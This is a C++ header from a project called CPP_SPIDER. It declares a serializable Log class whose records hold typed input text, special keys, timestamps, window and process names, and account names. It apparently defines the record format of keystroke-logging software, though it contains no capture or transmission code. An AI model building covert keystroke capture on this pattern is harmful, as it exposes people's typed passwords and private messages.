//
// Created by wurtz on 9/25/17.
//

#ifndef CPP_SPIDER_LOG_HPP
#define CPP_SPIDER_LOG_HPP

#include "Boost.hpp"

class Log
{
private:
    friend class boost::serialization::access;
    std::string                                         _data;

    template<class Archive>
    void serialize(Archive &ar, const unsigned int)
    {
        ar &_data;
    }

    void insertData(std::vector<std::map<std::string, std::string>> &log,
                    const std::string &inputText,
                    const std::string &inputSpecial,
                    const std::string &dateTime,
                    const std::string &windowName,
                    const std::string &processName);

public:
    enum delimiterName {flagDeliName = 0,
        idDeliName,
        tokenDeliName,
        inputTextDeliName,
        inputSpecialDeliName,
        dateTimeDeliName,
        windowNameDeliName,
        processNameDeliName,
        accountNameDeliName,
        endDeliName};
    static const std::string delimiterString[];

public:
	Log();
	~Log();

    void        setData(const std::string &inputLog);

    std::vector<std::map<std::string, std::string>>		getData();
};

#endif //CPP_SPIDER_LOG_HPP